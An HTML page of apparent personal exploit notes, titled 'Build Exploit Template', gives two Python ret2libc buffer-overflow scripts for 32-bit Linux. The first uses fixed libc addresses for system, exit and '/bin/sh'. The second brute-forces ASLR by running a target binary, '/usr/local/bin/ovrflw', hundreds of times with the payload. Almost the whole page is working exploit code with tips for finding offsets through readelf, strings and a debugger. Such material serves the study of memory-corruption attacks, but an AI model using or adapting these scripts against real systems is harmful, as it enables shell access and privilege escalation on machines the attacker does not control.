<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Build Exploit Template</title>
</head><body>This example below uses python struct. This is different if using pwn tools for python.<br/>
Version 1<br/>
-------------------------------------------------------------------------------------------<br/>
python code for RET2LIBC version 1 (no ASLR):<br/>
import struct<br/>
<br/>
system_addr = struct.pack("&lt;I",0xb7e55310) &#09;#address of system in libc, while debugging target program, 'p system'<br/>
exit_addr = struct.pack("&lt;I",0xd3adc0d3)&#09;&#09;#can choose to point to something, while debugging target program, 'p exit' for example (0xb7e48260)<br/>
arg_addr = struct.pack("&lt;I",0xb7f7584c)<br/>
<br/>
buf = "A" * 112<br/>
#buf += struct.pack("&lt;I",0xd3adc0d3) &#09;&#09;# the "&lt; I" is for little endian (it's an i) (d3adc0d3 is leet for deadcode)<br/>
# this is only for ensuring we are overwriting correct EIP and not needed afterward<br/>
buf += system_addr<br/>
buf += exit_addr<br/>
buf += arg_addr<br/>
-------------------------------------------------------------------------------------------<br/>
<br/>
<br/>
<br/>
<br/>
Version 2 updates<br/>
-------------------------------------------------------------------------------------------<br/>
python code for RET2LIBC version 2 (with ASLR bruteforce):<br/>
from subprocess import call&#09;&#09;&#09;&#09;# to call victim program<br/>
import struct<br/>
<br/>
libc_base_addr = 0xb75e000&#09;&#09;&#09;&#09;#obtained from random pick of ldd results<ul><li style="list-style-type: none">&nbsp;&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;#this is within the range of addresses we identified</li>
</ul>
<br/>
system_offset = 0x00040310&#09;&#09;&#09;&#09;#obtained from `readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system`<br/>
exit_offset = 0x00033260&#09;&#09;&#09;&#09;&#09;#doesn't "really" matter though, obtained from `readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit`<br/>
arg_offset = 0x00162bac&#09;&#09;&#09;&#09;&#09;#first bytes padded. /bin/sh, obtained from `strings -a -t -x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh`<br/>
<br/>
system_addr = struct.pack("&lt;I",libc_base_addr+system_offset) &#09;&#09;#address of system in libc+off, will 'eventually' hit this address<br/>
exit_addr = struct.pack("&lt;I",libc_base_addr+exit_offset)&#09;&#09;&#09;#address of libc+exit off<br/>
arg_addr = struct.pack("&lt;I",libc_base_addr+arg_offset)&#09;&#09;&#09;&#09;#address of libc+arg off<br/>
<br/>
buf = "A" * 112<br/>
buf += system_addr<br/>
buf += exit_addr<br/>
buf += arg_addr<br/>
<br/>
i = 0<br/>
while (i &lt; 512):<br/>
&nbsp; &nbsp; print "Try: %s" % i<br/>
&nbsp; &nbsp; i += 1<br/>
&nbsp; &nbsp; ret = call(["/usr/local/bin/ovrflw", buf])<br/>
-------------------------------------------------------------------------------------------<br/>
<br/>
Now, we can call this program 500ish times or more until we are successful<br/>
</body></html>